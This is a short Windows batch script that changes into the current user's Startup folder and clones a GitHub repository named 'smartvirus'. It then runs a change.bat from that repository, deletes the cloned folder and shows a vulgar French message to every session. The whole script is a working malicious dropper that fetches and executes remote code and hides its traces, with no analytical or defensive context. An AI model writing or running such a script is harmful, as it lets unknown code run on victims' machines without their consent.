setlocal enabledelayedexpansion
set "goto=%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
cd %goto%
git clone https://github.com/mattistjnn/smartvirus
cd smartvirus
Start change.bat
cd ..
rmdir /s /q smartvirus
msg * "sucez moi"